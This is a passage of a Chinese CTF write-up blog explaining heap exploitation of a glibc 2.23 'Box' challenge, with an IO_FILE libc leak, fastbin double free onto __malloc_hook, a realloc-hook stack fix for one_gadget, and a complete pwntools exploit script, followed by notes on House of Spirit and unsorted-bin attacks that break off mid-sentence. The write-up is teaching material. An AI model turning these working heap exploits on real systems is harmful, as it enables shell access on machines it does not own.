class="headerlink" title="准备工作"></a>准备工作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">edit(<span class="number">-12</span>, payload)</span><br><span class="line">lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line"><span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line"> <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">lg(<span class="string">"addr"</span>, addr)</span><br></pre></td></tr></table></figure><p>这里就是IO_FILE攻击，不清楚的可以自己学下，这里我学到个新操作。。我调试的时候要生要死的，没想到抛出异常，多亏大佬博客了，还有自己复现的时候用ida把前面一段打开文件那部分patch掉吧，不然感觉效率太慢了。。。</p><h4 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h4><p>这里还有个uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br></pre></td></tr></table></figure><p>这里常规操作，接下来的才是重头戏</p><h4 id="one-gadget失败"><a href="#one-gadget失败" class="headerlink" title="one_gadget失败"></a>one_gadget失败</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line"><span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里你用payload = “a”*0xb + p64(one_gadget)你会发觉成功不了，</p><p>而malloc_hook和realloc_hook通常是一起的，所以我们可以利用这个组合达到一个目的，调整栈过后在one_gadget,具体如何往下看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x45216 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>原因就是环境对不上，接下来讲下如何让环境对的上这个</p><ol><li><p>首先将realloc_hook覆盖成随便一个无法正常运行的地址<br>例如这种 payload = “a”*0xb + p64(0xAAAAAAAA)<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/1.png" alt="1.png"><br>成功断下</p></li><li><p>查看现在栈环境，跟上面的差别是什么</p></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30-0x20</span><br><span class="line">0x7ffc01f8c508:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c518:	0x00007fb957514e90	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x50</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x70</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">0x7ffc01f8c598:	0x5c71a837f5655700	0x0000562794412050</span><br><span class="line">0x7ffc01f8c5a8:	0x00007fb9574fe830	0x0000000000000001</span><br></pre></td></tr></table></figure><p>看，上述环境没有一个符合了，那么现在该如何做呢，发觉0x10可以，0x40可以，还有0x60可以，<br>栈是往低地址生长的<br>也就是说我们只要将rsp提高0x10,就变成rsp+0x10+0x30了就可以了</p><p>调用一个函数过后通常来说栈是平衡的<br>只要我们稍微改动一下我们调用的位置就行了，比如函数头地址+4，从这里开始执行，假设绕过一个push，这样的话，就相当于pop多一个，pop多一个的话，esp会提高一个寄存器大小的位置，也就是rsp=rsp+0x8<br>利用这个特性，我们也就是说可以调整栈，让其指定位置为0</p><p>我们调整第2个one_gadget吧，让其提高0x10就可以了，怎么让其提高呢，我们可以利用malloc这个函数，因为他会调用malloc_hook，组合调用<br>我就选了malloc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p __libc_malloc</span><br><span class="line"><span class="variable">$1</span> = &#123;void *(size_t)&#125; 0x7f4137102130 &lt;__GI___libc_malloc&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble 0x7f4137102130 </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> __GI___libc_malloc:</span><br><span class="line">   0x00007f4137102130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f4137102131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f4137102132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00007f4137102136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f4137441ef0</span></span><br><span class="line">   0x00007f413710213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f4137102140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f4137102143 &lt;+19&gt;:	jne    0x7f4137102298 &lt;__GI___libc_malloc+360&gt;</span><br><span class="line">   0x00007f4137102149 &lt;+25&gt;:	mov    rax,QWORD PTR [rip+0x33fc40]        <span class="comment"># 0x7</span></span><br></pre></td></tr></table></figure><p>看函数头，我们发觉有两个push，一个sub rsp,0x8,<br>计算下我们有0x18可控，所以我们提高0x10的话，就从+2开始就行了，<br>所以<strong>payload = “a”*0xb + p64(malloc+0x2) + p64(libc.address + one_gadget[1])</strong><br>前面的a填充过后就是realloc_hook，覆盖成malloc+0x2，所以这样让栈提高0x10,接下来是malloc函数，</p><p>具体个执行过程呢就是realloc_hook被覆盖成malloc+2了，malloc_hook被覆盖成one_gadget了，<br>所以先执行的是malloc+2,然后执行malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0x7f1e223d2132 &lt;malloc+2&gt;          sub    rsp, 8</span><br><span class="line">► 0x7f1e223d2136 &lt;malloc+6&gt;          mov    rax, qword ptr [rip + 0x33fdb3] &lt;0x7f1e223d2132&gt;</span><br><span class="line">  0x7f1e223d213d &lt;malloc+13&gt;         mov    rax, qword ptr [rax]</span><br><span class="line">  0x7f1e223d2140 &lt;malloc+16&gt;         <span class="built_in">test</span>   rax, rax</span><br><span class="line">  0x7f1e223d2143 &lt;malloc+19&gt;         jne    malloc+360 &lt;0x7f1e223d2298&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e223d2298 &lt;malloc+360&gt;        mov    rsi, qword ptr [rsp + 0x18]</span><br><span class="line">  0x7f1e223d229d &lt;malloc+365&gt;        add    rsp, 8</span><br><span class="line">  0x7f1e223d22a1 &lt;malloc+369&gt;        pop    rbx</span><br><span class="line">  0x7f1e223d22a2 &lt;malloc+370&gt;        pop    rbp</span><br><span class="line">  0x7f1e223d22a3 &lt;malloc+371&gt;        jmp    rax</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e2239326a &lt;do_system+1098&gt;    mov    rax, qword ptr [rip + 0x37ec47]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes) </span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) </span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc调用前会查看mallo_hook是否存在，存在就调用malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0x00007f1e223d2130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f1e223d2131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f1e223d2132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">=&gt; 0x00007f1e223d2136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f1e22711ef0</span></span><br><span class="line">   0x00007f1e223d213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f1e223d2140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f1e223d2143 &lt;+19&gt;:	jne    0x7f1e223d2298 &lt;__GI___libc_malloc+360&gt;</span><br></pre></td></tr></table></figure><p>这里就是查看malloc_hook部分，若有调到+360处</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/2.png" alt="2.png"></p><p>看，成功迁移位置</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/3.png" alt="3.png"></p><p>这个其实可以从malloc_hook调到realloc_hook，自然也可以跳别的函数，发挥想象</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.a0yo4SjOZB/Box'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line">text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    edit(<span class="number">-12</span>, payload)</span><br><span class="line">    lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">    addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">    libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line">    <span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line">	    <span class="keyword">raise</span> EOFError</span><br><span class="line">    </span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line">    <span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">    edit(<span class="number">3</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="unctf-driver"><a href="#unctf-driver" class="headerlink" title="unctf ## driver"></a>unctf ## driver</h2><p>开头没想到怎么利用，他利用了top_chunk合并将unsortbin合并了，以前只是防止合并，利用合并也是个知识盲点</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>House Of Spirit¶<br>介绍<br>House of Spirit 是 the Malloc Maleficarum 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK<br>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。<br>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p><p>又补充了知识盲区，要将chunk放入fastbin，得过掉检查，其中一个便是下一个chunk的size检查，不能小于两倍的size_s，并且不能大于sysstem_mem</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">      and used quickly in malloc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">      bordering top into fastbins</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="comment">//默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行</span></span><br><span class="line">       <span class="comment">// 如果当前chunk是fast chunk，并且下一个chunk是top chunk，则不能插入</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">            ) &#123;</span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能小于两倍的SIZE_SZ,并且</span></span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能大于system_mem， 一般为132k</span></span><br><span class="line">        <span class="comment">// 如果出现这样的情况，就报错。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(</span><br><span class="line">                chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">            __builtin_expect(</span><br><span class="line">                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">/* We might not have a lock at this point and concurrent</span></span><br><span class="line"><span class="comment">               modifications</span></span><br><span class="line"><span class="comment">               of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">               after getting the lock.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">                    assert(locked == <span class="number">0</span>);</span><br><span class="line">                    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">                    locked = <span class="number">1</span>;</span><br><span class="line">                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ ||</span><br><span class="line">                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">                &#125;)) &#123;</span><br><span class="line">                errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">                __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">                locked = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将chunk的mem部分全部设置为perturb_byte</span></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">        <span class="comment">// 设置fast chunk的标记位</span></span><br><span class="line">        set_fastchunks(av);</span><br><span class="line">        <span class="comment">// 根据大小获取fast bin的索引</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">        <span class="comment">// 获取对应fastbin的头指针，被初始化后为NULL。</span></span><br><span class="line">        fb               = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">        <span class="comment">// 使用原子操作将P插入到链表中</span></span><br><span class="line">        mchunkptr    old     = *fb, old2;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">               add</span></span><br><span class="line"><span class="comment">               (i.e., double free).  */</span></span><br><span class="line">            <span class="comment">// so we can not double free one fastbin chunk</span></span><br><span class="line">            <span class="comment">// 防止对 fast bin double free</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">               size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">               only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">                old_idx = fastbin_index(chunksize(old));</span><br><span class="line">            p-&gt;fd = old2 = old;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=</span><br><span class="line">                 old2);</span><br><span class="line">        <span class="comment">// 确保fast bin的加入前与加入后相同</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>还用到了unsortbin攻击，强，各种组合，多次house of sprit加unsortbin攻击</p><p>整体流程，unlink造成可以house of sprit攻击，然后通过多次house of sprit攻击，后门用unsortedbin攻击，最后getshell,流程复杂，原理简单</p><p>我本来想用chunk extends加fastbin 